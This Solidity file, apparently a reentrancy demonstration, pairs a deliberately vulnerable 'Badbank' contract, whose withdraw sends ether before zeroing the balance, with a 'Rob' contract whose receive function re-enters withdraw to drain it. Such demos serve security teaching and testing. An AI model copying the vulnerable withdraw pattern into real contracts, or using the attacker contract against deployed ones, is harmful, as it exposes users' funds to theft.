//SPDX-License-Identifier  :    MIT
pragma solidity ^0.8.26;

import {Address} from "@openzeppelin/contracts/utils/Address.sol";

contract Badbank{
using Address for address;
mapping(address => uint256) public balances;

function deposit() external payable {
    require(msg.value > 0 , "ZERO AMOUNT");
    require(msg.sender != address(0), "INVALID ADDRESS");
    balances[msg.sender] += msg.value ;
}

function withdraw() external payable {
uint256 balance = balances[msg.sender];
require(balance > 0 , "No BAALNCE");
Address.sendValue(payable(msg.sender),balance);
balances[msg.sender] = 0;
}

function bankBalance() view external returns(uint256){
    return address(this).balance;
}
}

contract Rob{
    Badbank public bank;
    uint8 public count;

    constructor(address _bank) {
        bank = Badbank(_bank);
    }
    
    function deposit() external payable{
        bank.deposit{value:msg.value}();
    }

    function rob() public payable{
     bank.withdraw();
    }
   
   function robBalance() view external returns(uint256){
    return address(this).balance;
}
    receive() external payable{
      count++;
      if(count < 5){
       rob();
      }  
   
    }
    
}